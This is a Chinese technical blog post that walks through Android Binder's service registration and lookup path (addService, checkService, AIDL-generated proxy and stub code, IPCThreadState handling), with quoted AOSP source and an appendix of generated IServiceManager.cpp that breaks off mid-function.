MediaPlayerService::instantiate() &#123; defaultServiceManager()->addService( String16(\"media.player\"), new MediaPlayerService());&#125;# defaultServiceManager()-&gt;addService //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppstatus_t ServiceManagerShim::addService(const String16&amp; name, const sp&lt;IBinder>&amp; service, bool allowIsolated, int dumpsysPriority)&#123; Status status = mTheRealServiceManager->addService( String8(name).c_str(), service, allowIsolated, dumpsysPriority); return status.exceptionCode();&#125;这里使用了 mTheRealServiceManager 中的 addService 方法，那么 mTheRealServiceManager 是从哪里来的呢？ # mTheRealServiceManager //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppusing AidlServiceManager = android::os::IServiceManager;// From the old libbinder IServiceManager interface to IServiceManager.class ServiceManagerShim : public IServiceManager&#123;public: ...private: sp&lt;AidlServiceManager> mTheRealServiceManager;&#125;;ServiceManagerShim::ServiceManagerShim(const sp&lt;AidlServiceManager>&amp; impl) : mTheRealServiceManager(impl)&#123;&#125;从这段 ServiceManagerShim 类的声明中，我们可以清楚的看到 mTheRealServiceManager 是 android::os::IServiceManager 类型的实例，并且在 ServiceManagerShim 实例化时赋值 而在 ServiceManager 的获取过程 中，我们知道 ServiceManagerShim 是在 defaultServiceManager() 中实例化的 //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppsp&lt;IServiceManager> defaultServiceManager()&#123; std::call_once(gSmOnce, []() &#123; sp&lt;AidlServiceManager> sm = nullptr; while (sm == nullptr) &#123; // 获取 ServiceManager 的 BBinder 所对应的 BpBinder 对象， // 并将该对象通过 interface_cast 转换为 AidlServiceManager sm = interface_cast&lt;AidlServiceManager>(ProcessState::self()->getContextObject(nullptr)); if (sm == nullptr) &#123; ALOGE(\"Waiting 1s on context object on %s.\", ProcessState::self()->getDriverName().c_str()); sleep(1); &#125; &#125; // 实例化 ServiceManagerShim gDefaultServiceManager = sp&lt;ServiceManagerShim>::make(sm); &#125;); return gDefaultServiceManager;&#125;所以说 mTheRealServiceManager 其实是 BpServiceManager(new BpBinder(0)) , 注册服务的顺序为 BpServiceManager--&gt;BpBinder--&gt;IPCThreadState--&gt;ioctl 而 BpServiceManager 现在是由 AIDL 自动生成，在框架编译完成之后的 out 目录中的 BpServiceManager::addService //platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm_armv8-a_shared/gen/aidl/android/os/IServiceManager.cppnamespace android &#123;namespace os &#123;BpServiceManager::BpServiceManager(const ::android::sp&lt;::android::IBinder>&amp; _aidl_impl) : BpInterface&lt;IServiceManager>(_aidl_impl)&#123;//_aidl_impl 就是 BpBinder (0) 实例&#125;-------------------------------------------------- ::android::binder::Status BpServiceManager::addService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, bool allowIsolated, int32_t dumpPriority) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong());//0、和 Rpc Binder 有关 ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; //1、写 interface _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //2、写 name _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //3、写 binder 对象 _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //4、写 allowIsolated _aidl_ret_status = _aidl_data.writeBool(allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //5、写 dumpPriority _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //6、借助 BpBinder (0)#transact 来发起 Binder 通信 _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_addService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->addService(name, service, allowIsolated, dumpPriority); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //7、如果有返回值就从这个 parcel 包里读 _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;这个过程主要是借助 BpBinder(0)#transact 来发起 Binder 通信，Binder 驱动根据 handle == 0 找到我们的 ServiceManager 进程，唤醒他开始处理请求。 还记得在 ServiceManager 的启动过程 中的那个 while 循环函数吗？BinderCallback 就是用来处理 Binder 驱动发送的 BR_TRANSACTION 信号的 //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppint main(int argc, char** argv) &#123; ... // 准备 looper sp&lt;Looper> looper = Looper::prepare(false /*allowNonCallbacks*/); // 监听 BC_ENTER_LOOPER 信号，收到该信号后回调处理 binder 调用 BinderCallback::setupTo(looper); // 监听客户端回调 ClientCallbackCallback::setupTo(looper, manager); // 阻塞等待和处理事件 while(true) &#123; looper->pollAll(-1); &#125; // should not be reached return EXIT_FAILURE;&#125;# BinderCallback BinderCallback::handleEvent 调用了 IPCThreadState::self()-&gt;handlePolledCommands() 来处理命令 //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppclass BinderCallback : public LooperCallback &#123;public: static sp&lt;BinderCallback> setupTo(const sp&lt;Looper>&amp; looper) &#123; sp&lt;BinderCallback> cb = sp&lt;BinderCallback>::make(); int binder_fd = -1; // 监听 BC_ENTER_LOOPER 信号 IPCThreadState::self()->setupPolling(&amp;binder_fd); LOG_ALWAYS_FATAL_IF(binder_fd &lt; 0, \"Failed to setupPolling: %d\", binder_fd); int ret = looper->addFd(binder_fd, Looper::POLL_CALLBACK, Looper::EVENT_INPUT, cb, nullptr /*data*/); LOG_ALWAYS_FATAL_IF(ret != 1, \"Failed to add binder FD to Looper\"); return cb; &#125; int handleEvent(int /* fd */, int /* events */, void* /* data */) override &#123; IPCThreadState::self()->handlePolledCommands(); return 1; // Continue receiving callbacks. &#125;&#125;;# IPCThreadState::handlePolledCommands //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::handlePolledCommands()&#123; status_t result; do &#123; // 获取并执行命令 result = getAndExecuteCommand(); &#125; while (mIn.dataPosition() &lt; mIn.dataSize()); processPendingDerefs(); flushCommands(); return result;&#125;# IPCThreadState::getAndExecuteCommand //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::getAndExecuteCommand()&#123; status_t result; int32_t cmd; // 和 binder 驱动通信，获取或传输数据 result = talkWithDriver(); if (result >= NO_ERROR) &#123; size_t IN = mIn.dataAvail(); if (IN &lt; sizeof(int32_t)) return result; // 读取命令 cmd = mIn.readInt32(); IF_LOG_COMMANDS() &#123; alog &lt;&lt; \"Processing top-level Command: \" &lt;&lt; getReturnString(cmd) &lt;&lt; endl; &#125; pthread_mutex_lock(&amp;mProcess->mThreadCountLock); mProcess->mExecutingThreadsCount++; if (mProcess->mExecutingThreadsCount >= mProcess->mMaxThreads &amp;&amp; mProcess->mStarvationStartTimeMs == 0) &#123; mProcess->mStarvationStartTimeMs = uptimeMillis(); &#125; pthread_mutex_unlock(&amp;mProcess->mThreadCountLock); // 解析并执行命令 result = executeCommand(cmd); pthread_mutex_lock(&amp;mProcess->mThreadCountLock); mProcess->mExecutingThreadsCount--; if (mProcess->mExecutingThreadsCount &lt; mProcess->mMaxThreads &amp;&amp; mProcess->mStarvationStartTimeMs != 0) &#123; int64_t starvationTimeMs = uptimeMillis() - mProcess->mStarvationStartTimeMs; if (starvationTimeMs > 100) &#123; ALOGE(\"binder thread pool (%zu threads) starved for %\" PRId64 \" ms\", mProcess->mMaxThreads, starvationTimeMs); &#125; mProcess->mStarvationStartTimeMs = 0; &#125; // Cond broadcast can be expensive, so don't send it every time a binder // call is processed. b/168806193 if (mProcess->mWaitingForThreads > 0) &#123; pthread_cond_broadcast(&amp;mProcess->mThreadCountDecrement); &#125; pthread_mutex_unlock(&amp;mProcess->mThreadCountLock); &#125; return result;&#125;# IPCThreadState::executeCommand //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::executeCommand(int32_t cmd)&#123; switch ((uint32_t)cmd) &#123; case BR_TRANSACTION: &#123; // 因为目的端 SM 所以 tr.target.ptr 为 0 if (tr.target.ptr) &#123; ... &#125;else &#123;// 开始业务分发 error = the_context_object->transact(tr.code, buffer, &amp;reply, tr.flags); &#125;# IPCThreadState::setTheContextObject 在 ServiceManager 的启动过程 这节的内容中，我们让 ServiceManager 成为了整个 binder IPC 通信中的上下文管理者，并将其存储在全局变量 the_context_object 中 //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppsp&lt;BBinder> the_context_object;void IPCThreadState::setTheContextObject(const sp&lt;BBinder>&amp; obj)&#123; the_context_object = obj;&#125;int main(int argc, char** argv) &#123; ... // 将 \"manager\" 服务作为服务端 Bbinder 对象 IPCThreadState::self()->setTheContextObject(manager); // 向 binder 驱动发送 ioctl BINDER_SET_CONTEXT_MGR_EXT 信号，将 servicemanager // 在 ProcessState::initWithDriver 中打开驱动设备 /dev/driver 所返回的文件描述符句柄 // 作为整个 binder IPC 通信中的上下文管理者 ps->becomeContextManager(); ...&#125;# BBinder::transact 所以 the_context_object-&gt;transact() 调用就走到 BBinder 的 transact //platform\\frameworks\\native\\libs\\binder\\Binder.cpp// NOLINTNEXTLINE(google-default-arguments)status_t BBinder::transact( uint32_t code, const Parcel&amp; data, Parcel* reply, uint32_t flags)&#123; data.setDataPosition(0); if (reply != nullptr &amp;&amp; (flags &amp; FLAG_CLEAR_BUF)) &#123; reply->markSensitive(); &#125; status_t err = NO_ERROR; switch (code) &#123; case PING_TRANSACTION: err = pingBinder(); break; case EXTENSION_TRANSACTION: err = reply->writeStrongBinder(getExtension()); break; case DEBUG_PID_TRANSACTION: err = reply->writeInt32(getDebugPid()); break; default: err = onTransact(code, data, reply, flags); break; &#125; // In case this is being transacted on in the same process. if (reply != nullptr) &#123; reply->setDataPosition(0); &#125; return err;&#125;# BnServiceManager::onTransact 然后回到了这个 AIDL 自动生成的 IServiceManager.cpp 中 BnServiceManager 的 onTransact () 方法里 //platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; case BnServiceManager::TRANSACTION_addService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; bool in_allowIsolated; int32_t in_dumpPriority; // 检查 interface if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; // 读 name _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // 读 binder _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // 读 in_allowIsolated _aidl_ret_status = _aidl_data.readBool(&amp;in_allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // 读 in_dumpPriority _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // 调用真正的 ServiceManager.cpp 中的实现 addService ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)); // 如果有返回写返回到 _aidl_reply _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125;# ServiceManager::addService 这里是和 Bp 端是对称的操作，下一步走到 ServiceManager.cpp::addService 方法 QUESTION? 为什么通过 ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)) 可以调用到 ServiceManager::addService ? //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::addService(const std::string&amp; name, const sp&lt;IBinder>&amp; binder, bool allowIsolated, int32_t dumpPriority) &#123; auto ctx = mAccess->getCallingContext(); // apps cannot add services if (multiuser_get_app_id(ctx.uid) >= AID_APP) &#123; return Status::fromExceptionCode(Status::EX_SECURITY); &#125; if (!mAccess->canAdd(ctx, name)) &#123; return Status::fromExceptionCode(Status::EX_SECURITY); &#125; if (binder == nullptr) &#123; return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125; // 检验 Service 名称的合法性，名称长度要求大于 0 并小于等于 127 // 字符仅包括 [a-z][A-Z][0-9]_-./ if (!isValidServiceName(name)) &#123; LOG(ERROR) &lt;&lt; \"Invalid service name: \" &lt;&lt; name; return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125;#ifndef VENDORSERVICEMANAGER if (!meetsDeclarationRequirements(binder, name)) &#123; // already logged return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125;#endif // !VENDORSERVICEMANAGER // implicitly unlinked when the binder is removed // 为 binder 对象设置死亡代理 /* 在和 service 进行交互时，service 返回一个 Binder 对象。 Binder 是工作在 service 端，如果，由于某种原因，服务端出现故障而死亡， 那么该返回的 Binder 对象也将消失，这时，如果我们在客户端在使用 Binder 对象 进行某些函数调用将会出现错误。为了避免该情况的发生，我们可以为 Binder 对象设置死亡代理 (linkToDeath)。当出现和服务端连接发生故障时， 系统将自动调用死亡代理函数 binderDied ()。 */ if (binder->remoteBinder() != nullptr &amp;&amp; binder->linkToDeath(sp&lt;ServiceManager>::fromExisting(this)) != OK) &#123; LOG(ERROR) &lt;&lt; \"Could not linkToDeath when adding \" &lt;&lt; name; return Status::fromExceptionCode(Status::EX_ILLEGAL_STATE); &#125; // Overwrite the old service if it exists // 添加服务，以 name 作为索引值，使用 binder 作为参数实例化 Service 对象 mNameToService[name] = Service &#123; .binder = binder, .allowIsolated = allowIsolated, .dumpPriority = dumpPriority, .debugPid = ctx.debugPid, &#125;; /* 检查服务注册的合法性，包括 1. 服务是否存在 2. 该服务是否是服务端注册的 3. 是否有同名服务存在 4. 为该服务注册的死亡代理是否成功 */ auto it = mNameToRegistrationCallback.find(name); if (it != mNameToRegistrationCallback.end()) &#123; for (const sp&lt;IServiceCallback>&amp; cb : it->second) &#123; mNameToService[name].guaranteeClient = true; // permission checked in registerForNotifications cb->onRegistration(name, binder); &#125; &#125; return Status::ok();&#125;# 总结 Server 想要向 ServiceManager 注册服务，首先通过 defaultServiceManager 获取到一个 Service Manager 的代理对象，然后再调用它的成员函数 addService 将该 Service 组件注册到 Service Manager 中，该代理对象通过向 Binder 驱动设备发送 BC_TRANSACTION 信号和 Service Manager 通信，在 Service Manager 启动之后会进入一个阻塞的无限循环， Service Manager 通过 BinderCallback 回调函数处理 Binder 驱动设备返回的 BR_TRANSACTION , 调用 BBinder 的 transact 方法，这个方法将会把我们引到 BnServiceManager 的 onTransact () 方法，终于这个方法将我们带到了真正添加服务的方法 ServiceManager.cpp::addService, 并向 mNameToService 字典中添加 name: Service 的键值对，来为 Client 向 ServiceManager 获取服务的过程做数据准备. # Client 向 ServiceManager 获取服务 这里以 MediaServer 为例来分析 Client 向 ServiceManager 获取服务的过程 // android-platform\\frameworks\\av\\media\\libmedia\\IMediaDeathNotifier.cpp// establish binder interface to MediaPlayerService/*static*/const sp&lt;IMediaPlayerService>IMediaDeathNotifier::getMediaPlayerService()&#123; ALOGV(\"getMediaPlayerService\"); Mutex::Autolock _l(sServiceLock); if (sMediaPlayerService == 0) &#123; sp&lt;IServiceManager> sm = defaultServiceManager(); sp&lt;IBinder> binder; do &#123; binder = sm->getService(String16(\"media.player\"));// 核心函数，获取名为 media.player 的服务，因为在之前 Server 已经向 ServiceManager 注册过了 if (binder != 0) &#123; break; &#125; ALOGW(\"Media player service not published, waiting...\"); usleep(500000); // 0.5 s 一个无限循环每 0.5 秒就获取一次服务，知道获取到权限 &#125; while (true); if (sDeathNotifier == NULL) &#123; sDeathNotifier = new DeathNotifier();//Service 死亡后创建死亡通知 &#125; binder->linkToDeath(sDeathNotifier); sMediaPlayerService = interface_cast&lt;IMediaPlayerService>(binder); &#125; ALOGE_IF(sMediaPlayerService == 0, \"no media player service!?\"); return sMediaPlayerService;&#125;# ServiceManagerShim::getService 这里调用 ServiceManagerShim::checkService 来寻找以注册的服务 //android-platform\\frameworks\\native\\libs\\binder\\IServiceManager.cpp// This implementation could be simplified and made more efficient by delegating// to waitForService. However, this changes the threading structure in some// cases and could potentially break prebuilts. Once we have higher logistical// complexity, this could be attempted.sp&lt;IBinder> ServiceManagerShim::getService(const String16&amp; name) const&#123; static bool gSystemBootCompleted = false; sp&lt;IBinder> svc = checkService(name);// 检查一下指定的服务名称是否存在 if (svc != nullptr) return svc;// 找到了 直接返回 //verder 进程服务获取逻辑，这里不做分析 const bool isVendorService = strcmp(ProcessState::self()->getDriverName().c_str(), \"/dev/vndbinder\") == 0; constexpr int64_t timeout = 5000; int64_t startTime = uptimeMillis(); // Vendor code can't access system properties if (!gSystemBootCompleted &amp;&amp; !isVendorService) &#123;#ifdef __ANDROID__ char bootCompleted[PROPERTY_VALUE_MAX]; property_get(\"sys.boot_completed\", bootCompleted, \"0\"); gSystemBootCompleted = strcmp(bootCompleted, \"1\") == 0 ? true : false;#else gSystemBootCompleted = true;#endif &#125; // retry interval in millisecond; note that vendor services stay at 100ms const useconds_t sleepTime = gSystemBootCompleted ? 1000 : 100; ALOGI(\"Waiting for service '%s' on '%s'...\", String8(name).string(), ProcessState::self()->getDriverName().c_str()); int n = 0; while (uptimeMillis() - startTime &lt; timeout) &#123; n++; usleep(1000*sleepTime); sp&lt;IBinder> svc = checkService(name); if (svc != nullptr) &#123; ALOGI(\"Waiting for service '%s' on '%s' successful after waiting %\" PRIi64 \"ms\", String8(name).string(), ProcessState::self()->getDriverName().c_str(), uptimeMillis() - startTime); return svc; &#125; &#125; ALOGW(\"Service %s didn't start. Returning NULL\", String8(name).string()); return nullptr;&#125;# ServiceManagerShim::checkService 这里和 Server 向 ServiceManager 注册服务一节开头中的形式一样，也是通过 mTheRealServiceManager 来执行核心的获取服务逻辑，对该变量的赋值于分析可参阅 mTheRealServiceManager sp&lt;IBinder> ServiceManagerShim::checkService(const String16&amp; name) const&#123; sp&lt;IBinder> ret; if (!mTheRealServiceManager->checkService(String8(name).c_str(), &amp;ret).isOk()) &#123; return nullptr; &#125; return ret;&#125;# BpServiceManager::checkService 同样的，我们需要从安卓框架编译之后的输入文件中找到由模板 aidl 生成的 IServiceManager.cpp ///android-platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm64_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp::android::binder::Status BpServiceManager::checkService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; //1. 写 interface _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //2. 将要查询的 Service name 写入 _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; // 借助 BpBinder (0)#transact 来发起 Binder 通信 _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_checkService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->checkService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;# BnServiceManager::onTransact 与 Server向ServiceManager注册服务 中相类似， BpBinder(0)#transact 来发起 Binder 通信后，BinderCallback 处理 Binder 驱动发送的 BR_TRANSACTION 信号，并交由 IPCThreadState::self()-&gt;handlePolledCommands() 来处理命令，最终来到由 aidl 生成的 aidl/android/os/IServiceManager.cpp 的 BnServiceManager::onTransact 去执行命令，与 ServiceManager 通过 Binder 通信 ::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; ... case BnServiceManager::TRANSACTION_checkService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; // 写入要查询的名称 _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // 调用真正的 ServiceManager.cpp 中的实现 addService ::android::binder::Status _aidl_status(checkService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; ... if (_aidl_ret_status == ::android::UNEXPECTED_NULL) &#123; _aidl_ret_status = ::android::binder::Status::fromExceptionCode(::android::binder::Status::EX_NULL_POINTER).writeToParcel(_aidl_reply); &#125; return _aidl_ret_status;&#125;# ServiceManager::checkService 同样和 Bp 端是对称的操作，下一步走到 ServiceManager.cpp::checkService 方法中 //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::checkService(const std::string&amp; name, sp&lt;IBinder>* outBinder) &#123; *outBinder = tryGetService(name, false); // returns ok regardless of result for legacy reasons return Status::ok();&#125;# ServiceManager::tryGetService //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppsp&lt;IBinder> ServiceManager::tryGetService(const std::string&amp; name, bool startIfNotFound) &#123; auto ctx = mAccess->getCallingContext(); sp&lt;IBinder> out; Service* service = nullptr; // 调用 mNameToService.find 利用 id 查找 Service if (auto it = mNameToService.find(name); it != mNameToService.end()) &#123; service = &amp;(it->second); if (!service->allowIsolated) &#123; uid_t appid = multiuser_get_app_id(ctx.uid); bool isIsolated = appid >= AID_ISOLATED_START &amp;&amp; appid &lt;= AID_ISOLATED_END; if (isIsolated) &#123; return nullptr; &#125; &#125; out = service->binder; &#125; if (!mAccess->canFind(ctx, name)) &#123; return nullptr; &#125; // 如果 Service 没有启动的话就尝试启动 Servicve if (!out &amp;&amp; startIfNotFound) &#123; tryStartService(name); &#125; if (out) &#123; // Setting this guarantee each time we hand out a binder ensures that the client-checking // loop knows about the event even if the client immediately drops the service service->guaranteeClient = true; &#125; return out;&#125;而倘若我们深究 mNameToService , 它可以在 ServiceManager.h 找到定义 //platform/frameworks/native/libs/fakeservicemanager/ServiceManager.hclass ServiceManager : public IServiceManager &#123;public: ...private: std::map&lt;String16, sp&lt;IBinder>> mNameToService;&#125;;&#125; // namespace android这样一看原来查找的过程很简单，就是在一个 map 字典里找找是否含有这个键，如果有的话，就是查找成功了并且返回 IBinder 类型的值，添加向字典中添加键值的过程其实已经在注册服务的时候做好了 //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::addService(const std::string&amp; name, const sp&lt;IBinder>&amp; binder, bool allowIsolated, int32_t dumpPriority) &#123; ... // Overwrite the old service if it exists // 添加服务，以 name 作为索引值，使用 binder 作为参数实例化 Service 对象 mNameToService[name] = Service &#123; .binder = binder, .allowIsolated = allowIsolated, .dumpPriority = dumpPriority, .debugPid = ctx.debugPid, &#125;; /* 检查服务注册的合法性，包括 1. 服务是否存在 2. 该服务是否是服务端注册的 3. 是否有同名服务存在 4. 为该服务注册的死亡代理是否成功 */ auto it = mNameToRegistrationCallback.find(name); if (it != mNameToRegistrationCallback.end()) &#123; for (const sp&lt;IServiceCallback>&amp; cb : it->second) &#123; mNameToService[name].guaranteeClient = true; // permission checked in registerForNotifications cb->onRegistration(name, binder); &#125; &#125; return Status::ok();&#125;# 总结 Client 向 ServiceManager 获取服务的过程其实很简单，主要就是一个 map 字典查询的过程，值得注意的是，Client 与 ServiceManager 的通信也是通过 Binder 驱动进行的 # 附录 # 安卓系统编译后由 aidl 生成的 IServiceManager.cpp 编译系统版本: android-12.0.0_r34 platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm64_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp #include &lt;android/os/IServiceManager.h>#include &lt;android/os/BpServiceManager.h>namespace android &#123;namespace os &#123;DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(ServiceManager, \"android.os.IServiceManager\")&#125; // namespace os&#125; // namespace android#include &lt;android/os/BpServiceManager.h>#include &lt;android/os/BnServiceManager.h>#include &lt;binder/Parcel.h>#include &lt;android-base/macros.h>namespace android &#123;namespace os &#123;BpServiceManager::BpServiceManager(const ::android::sp&lt;::android::IBinder>&amp; _aidl_impl) : BpInterface&lt;IServiceManager>(_aidl_impl)&#123;&#125;::android::binder::Status BpServiceManager::getService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::checkService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_checkService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->checkService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::addService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, bool allowIsolated, int32_t dumpPriority) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != 